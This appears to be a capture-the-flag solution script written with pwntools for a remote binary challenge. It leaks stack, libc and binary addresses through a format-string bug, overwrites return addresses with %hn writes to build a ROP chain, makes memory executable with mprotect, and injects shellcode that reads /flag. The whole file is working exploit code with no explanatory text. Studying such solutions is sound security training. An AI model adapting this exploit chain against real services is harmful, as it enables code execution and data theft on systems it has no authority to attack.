#!/usr/bin/env python3
from mmap import MAP_ANON, MAP_SHARED
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
name = "./attachment_patched"
e = context.binary = ELF(name)
if args["REMOTE"]:
    p = remote("chal.polyuctf.com", 34023)
else:
    p = process(name)
    if args["GDB"]:
        gdb.attach(p, "#brva 0x1409\nc")

if args["REMOTE"]:
    libc = ELF("./libc.so.6")
else:
    libc = e.libc

p.send(b"%pAAA")

p.recvuntil(b"0x")
stack_leak = int(p.recvuntil(b"AAA", drop=True), 16)

info(f"{hex(stack_leak)=}")

payload = "%c%c%p%c"
written = 17
ra_addr = stack_leak - 27
expected = ra_addr & 0xffff
payload += f"%{expected - written}c"
written = expected & 0xff
payload += "%hn"
# lsb of main is 0xb
# jump to middle, avoid the weird stuff
payload += f"%{(0x4b-written)&0xff}c"
payload += "%41$hhn"


p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

p.recv(4)
libc_leak = int(p.recv(12), 16)
info(f"{hex(libc_leak)=}")
libc.address = libc_leak - 0x10e1f2
success(f"{hex(libc.address)=}")

p.send(b"%15$p")
p.recvuntil(b"give you one chance!!!\n0x")

elf_leak = int(p.recv(12), 16)
info(f"{hex(elf_leak)=}")
e.address = elf_leak - 0x140b
success(f"{hex(e.address)=}")

rop = ROP(libc)
start_addr = ra_addr + 0x30 # the ra of main
payload = flat([
    rop.rdi[0],
    start_addr + 0x18,
    libc.sym["gets"],
])

for i in range(0, len(payload), 2):
    written = 0x7e
    next_write = (start_addr + i - written) & 0xffff
    payload2 = f"%{0x7e}c%41$hhn"
    if next_write != 0:
        payload2 += f"%{next_write}c"
    payload2 += f"%29$hn"
    p.recvuntil(b"begin your challenge\n")
    p.send(payload2.encode())
    written = 0x7e
    next_write = (u16(payload[i:i+2]) - written) & 0xffff
    payload2 = f"%{0x7e}c%41$hhn"
    if next_write != 0:
        payload2 += f"%{next_write}c"
    payload2 += f"%43$hn"
    p.recvuntil(b"begin your challenge\n")
    p.send(payload2.encode())

# last value, 0x9 => leave ret, trigger rop
payload2 = f"%{0x9}c%41$hhnXXXXX\0"
p.recvuntil(b"begin your challenge\n")
print(hexdump(payload))
p.send(payload2.encode())
p.recvuntil(b"XXXXX")


rop = ROP(libc)
rop.call(libc.sym["mprotect"], [e.address + 0x4000, 0x1000, 7])
rop.call(libc.sym["read"], [0, e.address + 0x4000, 0x1000])
rop.call(e.address + 0x4000)

p.sendline(rop.chain())

pause()
file = f"/flag".encode().ljust(32, b"\0")
shellcode = f"""
/* try to list root */
/* SYS_openat: 0x101 */
/* SYS_getdents: 0x4e */
/* SYS_getdents64: 0xd9 */
/* SYS_stat: 0x4 */
/* SYS_io_setup: 0xce */
/* SYS_openat2: 437 */
/* SYS_getcwd: 79 */
/* /: 0x2f */

push 0x0
push 0x0
push 0x0
push 0x0
mov rax, {unpack(file[24:32].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(file[16:24].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(file[8:16].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(file[0:8].ljust(8, bytes([0])), "all")}
push rax

mov rax, 437
mov rdi, -100
mov rsi, rsp
lea rdx, [rsp + 32]
mov r10, 0x18
syscall

/*
mov rax, 0x4e
mov rdi, 3
mov rsi, rsp
mov rdx, 0x800
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 0x800
syscall

int3
*/

mov rax, 0
mov rdi, 3
mov rsi, rsp
mov rdx, 0x100
syscall

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 0x100
syscall

int3
"""

p.send(asm(shellcode))

buf = p.recv(0x800)
print(buf)

cur = 0
while cur < len(buf):
    inode = u64(buf[cur:cur + 8])
    info(f"{inode=}")
    d_reclen = u16(buf[cur + 16:cur + 18])
    info(f"{d_reclen=}")
    name = buf[cur + 18:cur + d_reclen - 2]
    idx = name.find(b"\0")
    if idx != -1:
        name = name[:idx]
    info(f"{name=}")
    ty = buf[cur + d_reclen - 1]
    info(f"{ty=}")
    print()

    cur += d_reclen
    if d_reclen == 0:
        break



p.interactive()
